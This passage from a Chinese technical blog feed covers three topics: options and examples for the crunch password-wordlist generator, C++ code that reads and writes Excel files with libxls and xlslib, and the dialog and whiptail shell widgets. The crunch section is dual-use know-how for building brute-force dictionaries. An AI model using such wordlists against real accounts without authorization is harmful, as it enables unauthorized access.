<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>-b</td>
<td>指定写入文件最大字节数,类型可为kb, mb, gb, kib, mib, and gib.注意此参数必须跟 -o START 一起使用</td>
</tr>
<tr>
<td>-c</td>
<td>指定写出文件的行数</td>
</tr>
<tr>
<td>-s</td>
<td>指定crunch从该字符串开始生成字典</td>
</tr>
<tr>
<td>-e</td>
<td>指定crunch从该字符串结束生成字典</td>
</tr>
<tr>
<td>-f</td>
<td>指定一个字符集合,默认路径 <strong>/usr/share/crunch/charset.lst</strong>,作用见下文</td>
</tr>
<tr>
<td>-l</td>
<td>类似于转义的操作</td>
</tr>
<tr>
<td>-o</td>
<td>指定写出文件名,要分清楚 <strong>-o START</strong></td>
</tr>
<tr>
<td>-t</td>
<td>指定生成字典的特殊格式,此参数乃crunch的核心!</td>
</tr>
<tr>
<td>-z</td>
<td>指定压缩生成的字典文件,格式为:gzip, bzip2, lzma, and 7z,且与 <strong>-o START</strong> 使用</td>
</tr>
<tr>
<td>-p</td>
<td>这个参数可以理解为把指定的字符串看做<strong>一个整体</strong>并自由组合</td>
</tr>
</tbody></table>
<p><strong>注意:在使用crunch生成字典时,一定要看生成的字典文件的预计大小.比如:[ crunch 1 8 ] 就是输出 1812GB 的数据!! 这样的话硬盘早就撑爆了!!</strong></p>
<h4 id="example1"><a href="#example1" class="headerlink" title="example1"></a>example1</h4><blockquote>
<p>$ crunch 1 8<br>这将会显示出从 a 到 zzzzzzzz 的数据,也就是1812GB!</p>
</blockquote>
<h4 id="example2"><a href="#example2" class="headerlink" title="example2"></a>example2</h4><blockquote>
<p>$ crunch 1 6 abcdefg -o mydict.lst<br>这将会生成一个从 a 到 gggggg 的字典文件</p>
</blockquote>
<h4 id="example3"><a href="#example3" class="headerlink" title="example3"></a>example3</h4><blockquote>
<p>$ crunch 8 8 -f /usr/share/crunch/charset.lst <strong>mixalpha-numeric-all-space</strong><br>这将生成 8位 大小写以及特殊符号的字典</p>
</blockquote>
<p>charset.lst文件如下:<br><img src="/uploads/images/linux/file_002.png" alt="img"></p>
<p>可以看到 mixalpha-numeric-all-space 表示 a-z,A-Z大小写+0-9数字+特殊字符:<br><strong>abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ012345 6789!@#$%^&amp;*()-_+=~`[]{}|:;”‘&lt;&gt;,.?/</strong></p>
<p>当指定 <strong>-f</strong> 参数时,必须要指明一个变量,如 <strong>mixalpha-numeric-all-space</strong></p>
<h4 id="example4"><a href="#example4" class="headerlink" title="example4"></a>example4</h4><blockquote>
<p>$ crunch 6 6 -s <strong>xxdog5</strong> -t <strong>@@dog%</strong><br>注意这里的<strong>格式</strong>,这里以 xxdog5 开始且字符个数必须为6,因为这里最小字符数为6,同时 <strong>-t</strong> 指定的该格式也必须时 <strong>-s</strong> 指定的格式.</p>
</blockquote>
<p>一般地,crunch的4个<strong>通配符</strong>代表了不同的意思</p>
<ul>
<li><strong>@</strong> :表示一个 a-z 小写字符</li>
<li><strong>,</strong> :表示一个 A-Z 大写字符</li>
<li><strong>%</strong> :表示一个 0-9 的数字</li>
<li><strong>^</strong> :表示一个象征符号</li>
</ul>
<p>弄清楚这几个后,上面的也就可以明白了,如果把 xxdog5 换成 xxdoga 就错了</p>
<h4 id="example5"><a href="#example5" class="headerlink" title="example5"></a>example5</h4><blockquote>
<p>$ crunch 3 3 -p abc<br>这里指定了 -p 参数,意味着吧 a,b,c 这三个字符进行组合 .输出结果为:<br>abc<br>acb<br>bac<br>bca<br>cab<br>cba</p>
</blockquote>
<p>当然这里也可以写成 <strong>crunch 3 3 -p a b c</strong><br>举一反三,再来一个例子:</p>
<blockquote>
<p>$ crunch 3 3 <strong>-p</strong> i love you<br>输出:<br>iloveyou<br>iyoulove<br>loveiyou<br>loveyoui<br>youilove<br>youlovei<br>可看到,该参数吧一个词看做整体来进行匹配</p>
</blockquote>
<h4 id="example6"><a href="#example6" class="headerlink" title="example6"></a>example6</h4><blockquote>
<p>$ crunch 3 3 abc <strong>-o START</strong> -c 10 -z bzip2<br>最后会生成3个.bz2压缩文件<br>aaa-baa.txt.bz2<br>bab-cab.txt.bz2<br>cac-ccc.txt.bz2</p>
</blockquote>
<p>这里使用参数 <strong>-o START</strong>, <strong>-c</strong> 表示生成的字典文件每个10行数据,直到生成结束,加入 <strong>-z bzip2</strong> 表示然后再把这些 .txt文件压缩成后缀为 .bz2的压缩包</p>
<p><strong>注意,这里没有必要再指定生成字典的文件名!</strong></p>
<h3 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h3><p>关于crunch的例子,可以查看文档,文档是个好东西~<br>熟悉crunch的使用,还是很重要的……</p>
<p>bye~</p>
]]></content>
      <categories>
        <category>Others</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux libxls和xlslib读写Excel文档</title>
    <url>/linux-xls/</url>
    <content><![CDATA[<p>这里要讨论的是两款开源库 <strong>libxls</strong> 和 <strong>xlslib</strong>,前者用与 <strong>读</strong> Excel,后者用于 <strong>写</strong> .所以可以在Linux或Windows上使用</p>
<a id="more"></a>

<h3 id="libxls-读Excel"><a href="#libxls-读Excel" class="headerlink" title="libxls(读Excel"></a>libxls(读Excel</h3><h4 id="获取libxls"><a href="#获取libxls" class="headerlink" title="获取libxls"></a>获取libxls</h4><p>可以在 <a href="http://libxls.sourceforge.net/" target="_blank" rel="noopener">官网</a> 获取源代码, 目前最新版为 1.4.0</p>
<blockquote>
<p>unzip libxls-1.4.0.zip<br>cd libxls<br>./configure<br>make<br>make install</p>
</blockquote>
<p>注意默认安装到 <strong>/usr/local</strong> 目录下,所以需要自己手动复制相关文件到系统目录下</p>
<blockquote>
<p>cp -r /usr/local/libxls/include/* /usr/include<br>cp -r /usr/local/libxls/lib/* /usr</p>
</blockquote>
<p>至此基本上可以了</p>
<h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p>test.cpp</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;xls.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> xls;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="comment">//版本信息</span></span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"version:"</span>&lt;&lt;xls::xls_getVersion()&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    xlsWorkBook *pwb;</span><br><span class="line">    xlsWorkSheet *pws;</span><br><span class="line">    <span class="comment">//打开一个excel表格</span></span><br><span class="line">    pwb=xls_open(<span class="string">"test.xls"</span>,<span class="string">"UTF-8"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!pwb)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"open failed!"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">    &#125;</span><br><span class="line">    xlsSummaryInfo *summaryInfo=xls_summaryInfo(pwb);</span><br><span class="line">    <span class="keyword">if</span>(summaryInfo)&#123;</span><br><span class="line">        <span class="keyword">if</span>(summaryInfo-&gt;title)<span class="built_in">cout</span>&lt;&lt;<span class="string">"title:"</span>&lt;&lt;summaryInfo-&gt;title&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">if</span>(summaryInfo-&gt;manager)<span class="built_in">cout</span>&lt;&lt;<span class="string">"manager:"</span>&lt;&lt;summaryInfo-&gt;manager&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">if</span>(summaryInfo-&gt;lastAuthor)<span class="built_in">cout</span>&lt;&lt;<span class="string">"lastAuthor:"</span>&lt;&lt;summaryInfo-&gt;lastAuthor&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">if</span>(summaryInfo-&gt;keywords)<span class="built_in">cout</span>&lt;&lt;<span class="string">"keywords:"</span>&lt;&lt;summaryInfo-&gt;keywords&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">if</span>(summaryInfo-&gt;company)<span class="built_in">cout</span>&lt;&lt;<span class="string">"company:"</span>&lt;&lt;summaryInfo-&gt;company&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">if</span>(summaryInfo-&gt;comment)<span class="built_in">cout</span>&lt;&lt;<span class="string">"comment:"</span>&lt;&lt;summaryInfo-&gt;comment&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">if</span>(summaryInfo-&gt;appName)<span class="built_in">cout</span>&lt;&lt;<span class="string">"appName:"</span>&lt;&lt;summaryInfo-&gt;appName&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">if</span>(summaryInfo-&gt;subject)<span class="built_in">cout</span>&lt;&lt;<span class="string">"subject:"</span>&lt;&lt;summaryInfo-&gt;subject&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"charset:"</span>&lt;&lt;pwb-&gt;charset&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"font name:"</span>&lt;&lt;pwb-&gt;fonts.font-&gt;name&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"font bold:"</span>&lt;&lt;pwb-&gt;fonts.font-&gt;bold&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"当前表名:"</span>&lt;&lt;pwb-&gt;sheets.sheet-&gt;name&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"总表数:"</span>&lt;&lt;pwb-&gt;sheets.count&lt;&lt;<span class="built_in">endl</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">//获取第一张表单 索引从0开始</span></span><br><span class="line">    pws= xls_getWorkSheet(pwb,<span class="number">0</span>);</span><br><span class="line">    <span class="comment">//开始解析表单</span></span><br><span class="line">    xls_parseWorkSheet(pws);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"行数:"</span>&lt;&lt;pws-&gt;rows.lastrow+<span class="number">1</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"列数:"</span>&lt;&lt;pws-&gt;rows.lastcol&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">//遍历</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; pws-&gt;rows.lastrow+<span class="number">1</span>; ++i) &#123;</span><br><span class="line">        <span class="comment">//xlsRow = st_row::st_row_data</span></span><br><span class="line">        <span class="comment">//获取每一行的数据</span></span><br><span class="line">        st_row::st_row_data row= pws-&gt;rows.row[i];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; pws-&gt;rows.lastcol; ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span>(row.cells.cell[j].str) &#123;</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; (<span class="keyword">char</span>*)row.cells.cell[j].str &lt;&lt; <span class="string">"\t"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//关闭</span></span><br><span class="line">    xls_close_WS(pws);</span><br><span class="line">    xls_close_WB(pwb);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意,由于我使用 clion 编写代码,所以在链接库时在 CMakeLists.txt 最后一行添加 <strong>target_link_libraries(libxls_read libxlsreader.so)</strong> 其中 <strong>libxls_read</strong> 为项目名.<br>或者直接 <code>g++ test.cpp -o libxls_read -lxlsreader</code></p>
<p>测试:<br>假设有一个Excel文件<br><img src="/uploads/images/libxls/file_001.png" alt="img"></p>
<p>执行程序输出</p>
<blockquote>
<p>version:1.4.0<br>标题:我是标题<br>keywords:我是关键字<br>comment:这是一个测试<br>subject:我是主题<br>charset:UTF-8<br>font name:文泉驿正黑<br>font bold:400<br>当前表名:第一张表单<br>总表数:1</p>
<p>行数:4<br>列数:5<br>刘备 关羽 张飞 曹操 刘禅<br>曹丕 赵云 孙权 黄盖 曹植<br>貂蝉 张角 孔明 周瑜 小乔<br>马超</p>
</blockquote>
<h3 id="xlslib-写Excel"><a href="#xlslib-写Excel" class="headerlink" title="xlslib(写Excel"></a>xlslib(写Excel</h3><h4 id="获取xlslib"><a href="#获取xlslib" class="headerlink" title="获取xlslib"></a>获取xlslib</h4><p>可以从 <a href="http://sourceforge.net/projects/xlslib/" target="_blank" rel="noopener">http://sourceforge.net/projects/xlslib/</a> 获取 xlslib并编译安装,同样的默认也是安装到 <strong>/usr/local/include</strong> ,需手动复制到系统目录下</p>
<blockquote>
<p>cp -r /usr/local/include/xlslib /usr/include/</p>
</blockquote>
<h4 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;xlslib/xlslib.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> xlslib_core;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    workbook wb;</span><br><span class="line">    <span class="built_in">string</span> label;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Version: %s\n"</span>,wb.version());</span><br><span class="line">    <span class="comment">//设置字体</span></span><br><span class="line">    <span class="keyword">font_t</span> *t=wb.font(<span class="string">"Ubuntu"</span>);</span><br><span class="line">    t-&gt;SetColor(CLR_RED);</span><br><span class="line">    t-&gt;SetItalic(<span class="literal">true</span>);</span><br><span class="line">    t-&gt;SetHeight(<span class="number">20</span>*<span class="number">15</span>);</span><br><span class="line">   <span class="comment">// t-&gt;SetBoldStyle(BOLDNESS_BOLD);</span></span><br><span class="line">    <span class="keyword">xf_t</span> *xf= wb.xformat();</span><br><span class="line">    xf-&gt;SetFillBGColor(CLR_GREEN);</span><br><span class="line">    xf-&gt;SetFillFGColor(CLR_RED);</span><br><span class="line">    xf-&gt;SetFont(t);</span><br><span class="line">    <span class="comment">//第一张表单</span></span><br><span class="line">    worksheet *ws=wb.sheet(<span class="string">"one"</span>);</span><br><span class="line">    <span class="comment">//第二张表单</span></span><br><span class="line">    worksheet* ws2=wb.sheet(<span class="string">"two"</span>);</span><br><span class="line">    ws-&gt;MakeActive();</span><br><span class="line">    <span class="comment">//设置列宽度,行高度</span></span><br><span class="line">    ws-&gt;defaultColwidth(<span class="number">15</span>);</span><br><span class="line">    ws-&gt;defaultRowHeight(<span class="number">25</span>);</span><br><span class="line">    <span class="comment">//6行</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i) &#123;</span><br><span class="line">        <span class="comment">//6列</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;<span class="number">6</span> ; ++j) &#123;</span><br><span class="line">            <span class="keyword">char</span> buf[<span class="number">20</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">sprintf</span>(buf,<span class="string">"%d"</span>,i*j);</span><br><span class="line">            label=buf;</span><br><span class="line">            <span class="comment">// 写入</span></span><br><span class="line">            <span class="keyword">cell_t</span> * cell= ws-&gt;label(i,j,label,xf);</span><br><span class="line">            <span class="comment">//或者 ws-&gt;number(i,j,i*j,xf);</span></span><br><span class="line">            <span class="comment">//设置字体阴影</span></span><br><span class="line">            cell-&gt;fontshadow(<span class="literal">true</span>);</span><br><span class="line">            <span class="comment">//设置单元格文本对齐</span></span><br><span class="line">            cell-&gt;halign(HALIGN_CENTER);</span><br><span class="line">            cell-&gt;valign(VALIGN_CENTER);</span><br><span class="line">            <span class="comment">//设置行高度</span></span><br><span class="line">            ws-&gt;rowheight(i,<span class="number">20</span>*<span class="number">15</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    range *ran=ws-&gt;rangegroup(<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>);</span><br><span class="line">    ran-&gt;cellcolor(CLR_GREEN);</span><br><span class="line">    <span class="comment">//保存到excel文件</span></span><br><span class="line">    wb.Dump(<span class="string">"mynew.xls"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux Shell窗口化</title>
    <url>/linux-shell-window/</url>
    <content><![CDATA[<p>前段时间在学习Linux shell编程时,发现了几个比较好玩的工具,这里给大家分享一下…(Just for fun!)</p>
<a id="more"></a>

<p>以下三个关于创建窗口部件的包,一般应用在没有窗口界面的脚本(Script)中</p>
<h3 id="1-Dialog"><a href="#1-Dialog" class="headerlink" title="1.Dialog"></a>1.Dialog</h3><p>安装方法: <code>apt-get install dialog</code></p>
<p>help:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cdialog (ComeOn Dialog!) version 1.3-20171209</span><br><span class="line">Copyright 2000-2016,2017 Thomas E. Dickey</span><br><span class="line">This is free software; see the source for copying conditions.  There is NO</span><br><span class="line">warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span><br><span class="line">* Display dialog boxes from shell scripts *</span><br><span class="line">Usage: dialog &lt;options&gt; &#123; --and-widget &lt;options&gt; &#125;</span><br><span class="line">where options are &quot;common&quot; options, followed by &quot;box&quot; options</span><br><span class="line">Special options:</span><br><span class="line">  [--create-rc &quot;file&quot;]</span><br><span class="line">Common options:</span><br><span class="line">  [--ascii-lines] [--aspect &lt;ratio&gt;] [--backtitle &lt;backtitle&gt;] [--beep]</span><br><span class="line">  [--beep-after] [--begin &lt;y&gt; &lt;x&gt;] [--cancel-label &lt;str&gt;] [--clear]</span><br><span class="line">  [--colors] [--column-separator &lt;str&gt;] [--cr-wrap] [--date-format &lt;str&gt;]</span><br><span class="line">  [--default-button &lt;str&gt;] [--default-item &lt;str&gt;] [--defaultno]</span><br><span class="line">  [--exit-label &lt;str&gt;] [--extra-button] [--extra-label &lt;str&gt;]</span><br><span class="line">  [--help-button] [--help-label &lt;str&gt;] [--help-status] [--help-tags]</span><br><span class="line">  [--hfile &lt;str&gt;] [--hline &lt;str&gt;] [--ignore] [--input-fd &lt;fd&gt;]</span><br><span class="line">  [--insecure] [--item-help] [--keep-tite] [--keep-window] [--last-key]</span><br><span class="line">  [--max-input &lt;n&gt;] [--no-cancel] [--no-collapse] [--no-cr-wrap]</span><br><span class="line">  [--no-items] [--no-kill] [--no-label &lt;str&gt;] [--no-lines] [--no-mouse]</span><br><span class="line">  [--no-nl-expand] [--no-ok] [--no-shadow] [--no-tags] [--nook]</span><br><span class="line">  [--ok-label &lt;str&gt;] [--output-fd &lt;fd&gt;] [--output-separator &lt;str&gt;]</span><br><span class="line">  [--print-maxsize] [--print-size] [--print-version] [--quoted]</span><br><span class="line">  [--reorder] [--scrollbar] [--separate-output] [--separate-widget &lt;str&gt;]</span><br><span class="line">  [--shadow] [--single-quoted] [--size-err] [--sleep &lt;secs&gt;] [--stderr]</span><br><span class="line">  [--stdout] [--tab-correct] [--tab-len &lt;n&gt;] [--time-format &lt;str&gt;]</span><br><span class="line">  [--timeout &lt;secs&gt;] [--title &lt;title&gt;] [--trace &lt;file&gt;] [--trim]</span><br><span class="line">  [--version] [--visit-items] [--week-start &lt;str&gt;] [--yes-label &lt;str&gt;]</span><br><span class="line">Box options:</span><br><span class="line">  --buildlist    &lt;text&gt; &lt;height&gt; &lt;width&gt; &lt;list-height&gt; &lt;tag1&gt; &lt;item1&gt; &lt;status1&gt;...</span><br><span class="line">  --calendar     &lt;text&gt; &lt;height&gt; &lt;width&gt; &lt;day&gt; &lt;month&gt; &lt;year&gt;</span><br><span class="line">  --checklist    &lt;text&gt; &lt;height&gt; &lt;width&gt; &lt;list height&gt; &lt;tag1&gt; &lt;item1&gt; &lt;status1&gt;...</span><br><span class="line">  --dselect      &lt;directory&gt; &lt;height&gt; &lt;width&gt;</span><br><span class="line">  --editbox      &lt;file&gt; &lt;height&gt; &lt;width&gt;</span><br><span class="line">  --form         &lt;text&gt; &lt;height&gt; &lt;width&gt; &lt;form height&gt; &lt;label1&gt; &lt;l_y1&gt; &lt;l_x1&gt; &lt;item1&gt; &lt;i_y1&gt; &lt;i_x1&gt; &lt;flen1&gt; &lt;ilen1&gt;...</span><br><span class="line">  --fselect      &lt;filepath&gt; &lt;height&gt; &lt;width&gt;</span><br><span class="line">  --gauge        &lt;text&gt; &lt;height&gt; &lt;width&gt; [&lt;percent&gt;]</span><br><span class="line">  --infobox      &lt;text&gt; &lt;height&gt; &lt;width&gt;</span><br><span class="line">  --inputbox     &lt;text&gt; &lt;height&gt; &lt;width&gt; [&lt;init&gt;]</span><br><span class="line">  --inputmenu    &lt;text&gt; &lt;height&gt; &lt;width&gt; &lt;menu height&gt; &lt;tag1&gt; &lt;item1&gt;...</span><br><span class="line">  --menu         &lt;text&gt; &lt;height&gt; &lt;width&gt; &lt;menu height&gt; &lt;tag1&gt; &lt;item1&gt;...</span><br><span class="line">  --mixedform    &lt;text&gt; &lt;height&gt; &lt;width&gt; &lt;form height&gt; &lt;label1&gt; &lt;l_y1&gt; &lt;l_x1&gt; &lt;item1&gt; &lt;i_y1&gt; &lt;i_x1&gt; &lt;flen1&gt; &lt;ilen1&gt; &lt;itype&gt;...</span><br><span class="line">  --mixedgauge   &lt;text&gt; &lt;height&gt; &lt;width&gt; &lt;percent&gt; &lt;tag1&gt; &lt;item1&gt;...</span><br><span class="line">  --msgbox       &lt;text&gt; &lt;height&gt; &lt;width&gt;</span><br><span class="line">  --passwordbox  &lt;text&gt; &lt;height&gt; &lt;width&gt; [&lt;init&gt;]</span><br><span class="line">  --passwordform &lt;text&gt; &lt;height&gt; &lt;width&gt; &lt;form height&gt; &lt;label1&gt; &lt;l_y1&gt; &lt;l_x1&gt; &lt;item1&gt; &lt;i_y1&gt; &lt;i_x1&gt; &lt;flen1&gt; &lt;ilen1&gt;...</span><br><span class="line">  --pause        &lt;text&gt; &lt;height&gt; &lt;width&gt; &lt;seconds&gt;</span><br><span class="line">  --prgbox       &lt;text&gt; &lt;command&gt; &lt;height&gt; &lt;width&gt;</span><br><span class="line">  --programbox   &lt;text&gt; &lt;height&gt; &lt;width&gt;</span><br><span class="line">  --progressbox  &lt;text&gt; &lt;height&gt; &lt;width&gt;</span><br><span class="line">  --radiolist    &lt;text&gt; &lt;height&gt; &lt;width&gt; &lt;list height&gt; &lt;tag1&gt; &lt;item1&gt; &lt;status1&gt;...</span><br><span class="line">  --rangebox     &lt;text&gt; &lt;height&gt; &lt;width&gt; &lt;min-value&gt; &lt;max-value&gt; &lt;default-value&gt;</span><br><span class="line">  --tailbox      &lt;file&gt; &lt;height&gt; &lt;width&gt;</span><br><span class="line">  --tailboxbg    &lt;file&gt; &lt;height&gt; &lt;width&gt;</span><br><span class="line">  --textbox      &lt;file&gt; &lt;height&gt; &lt;width&gt;</span><br><span class="line">  --timebox      &lt;text&gt; &lt;height&gt; &lt;width&gt; &lt;hour&gt; &lt;minute&gt; &lt;second&gt;</span><br><span class="line">  --treeview     &lt;text&gt; &lt;height&gt; &lt;width&gt; &lt;list-height&gt; &lt;tag1&gt; &lt;item1&gt; &lt;status1&gt; &lt;depth1&gt;...</span><br><span class="line">  --yesno        &lt;text&gt; &lt;height&gt; &lt;width&gt;</span><br><span class="line">Auto-size with height and width = 0. Maximize with height and width = -1.</span><br><span class="line">Global-auto-size if also menu_height/list_height = 0.</span><br></pre></td></tr></table></figure>

<h4 id="dialog-命令选项-option"><a href="#dialog-命令选项-option" class="headerlink" title="dialog 命令选项(option)"></a>dialog 命令选项(option)</h4><blockquote>
<p><strong>–add-widget</strong> 继续下个对话框,直到按下Esc或Cancel按钮<br><strong>–aspect ratio</strong> 指定窗口宽度和高度的宽高比<br><strong>–backtitle title</strong> 指定显示在屏幕顶部背景上的标题<br><strong>–begin x y</strong> 指定窗口左上角的起始位置<br><strong>–cancel-label label</strong> 指定Cancel按钮的替代标签<br><strong>–clear</strong> 用默认的对话背景色来清空屏幕内容<br><strong>–colors</strong> 在对话文本中嵌入ANSI色彩编码<br><strong>–cr-wrap</strong> 在对话文本中允许使用换行符并强制换行<br><strong>–create-rc file</strong> 将示例配置文件的内容复制到指定的file文件中 1<br><strong>–defaultno</strong> 将yes/no对话框的默认答案设为No<br><strong>–default-item string</strong> 设定复选列表、表单或菜单对话中的默认项<br><strong>–exit-label label</strong> 指定Exit按钮的替代标签<br><strong>–extra-button</strong> 在OK按钮和Cancel按钮之间显示一个额外按钮<br><strong>–extra-label label</strong> 指定额外按钮的替代标签<br><strong>–help</strong> 显示dialog命令的帮助信息<br><strong>–help-button</strong> 在OK按钮和Cancel按钮后显示一个Help按钮<br><strong>–help-label label</strong> 指定Help按钮的替代标签<br><strong>–help-status</strong> 当选定Help按钮后,在帮助信息后写入多选列表、单选列表或表单信息<br><strong>–ignore</strong> 忽略dialog不能识别的选项<br><strong>–input-fd fd</strong> 指定 STDIN 之外的另一个文件描述符<br><strong>–insecure</strong> 在password部件中键入内容时显示星号<br><strong>–item-help</strong> 为多选列表、单选列表或菜单中的每个标号在屏幕的底部添加一个帮助栏<br><strong>–keep-window</strong> 不要清除屏幕上显示过的部件<br><strong>–max-input size</strong> 指定输入的最大字符串长度。默认为2048<br><strong>–nocancel</strong> 隐藏Cancel按钮<br><strong>–no-collapse</strong> 不要将对话文本中的制表符转换成空格<br><strong>–no-kill</strong> 将tailboxbg对话放到后台,并禁止该进程的 SIGHUP 信号<br><strong>–no-label label</strong> 为No按钮指定替代标签<br><strong>–no-shadow</strong> 不要显示对话窗口的阴影效果<br><strong>–ok-label label</strong> 指定OK按钮的替代标签</p>
</blockquote>
<p><strong>注意: dialog 默认是重定向到标准错误(stderr).</strong><br>不过可以改变输出到标准输出 <strong>–stdout</strong> .这样用脚本也就能很快获取返回的文本了</p>
<h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><blockquote>
<p>$ dialog –timeout 5 <strong>–stdout</strong> –menu ‘Choose a job: ‘ 30 10 25 ‘Programmer’ 1 ‘Teacher’ 2 ‘Worker’ 3</p>
</blockquote>
<p>example.sh</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">name=$(dialog --max-input 5 --timeout 5 --inputbox 'Please enter your name: ' 10 10 'root' --stdout)</span><br><span class="line">job=$(dialog  --timeout 5 --stdout --menu  'Choose a job: ' 30 10 25 'Programmer' 1 'Teacher' 2 'Worker' 3)</span><br><span class="line">clear</span><br><span class="line">if [ -n "$name" ];then</span><br><span class="line">    echo "Your name is: [$name]"</span><br><span class="line">else</span><br><span class="line"><span class="meta">	#</span><span class="bash"><span class="keyword">do</span> something...</span></span><br><span class="line">fi</span><br><span class="line">echo -e "You are a :"$job"\t:)"</span><br></pre></td></tr></table></figure>

<h3 id="2-whiptail"><a href="#2-whiptail" class="headerlink" title="2.whiptail"></a>2.whiptail</h3><p>对比dialog,这个工具参数就少了一点,功能也就少了点,但基本的还是<br>要有的</p>
<blockquote>
<p>There are visual differences which are not addressed by command-line options:</p>
<p><strong>dialog</strong> centers lists within the window. whiptail typically puts lists against<br>the left margin.</p>
<p><strong>whiptail</strong> uses angle brackets (“&lt;” and “&gt;”) for marking buttons. dialog uses<br>square brackets.</p>
<p><strong>whiptail</strong> marks the limits of subtitles with vertical bars. dialog does not<br>mark the limits.</p>
<p><strong>whiptail</strong> attempts to mark the top/bottom cells of a scrollbar with up/down ar‐<br>rows. When it cannot do this, it fills those cells with the background color<br>of the scrollbar and confusing the user. dialog uses the entire scrollbar<br>space, thereby getting better resolution.</p>
</blockquote>
<h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><p><strong>Most whiptail scripts write tostandard error, but error messages may also be written there, depend‐ing on your script.</strong></p>
<p>help</p>
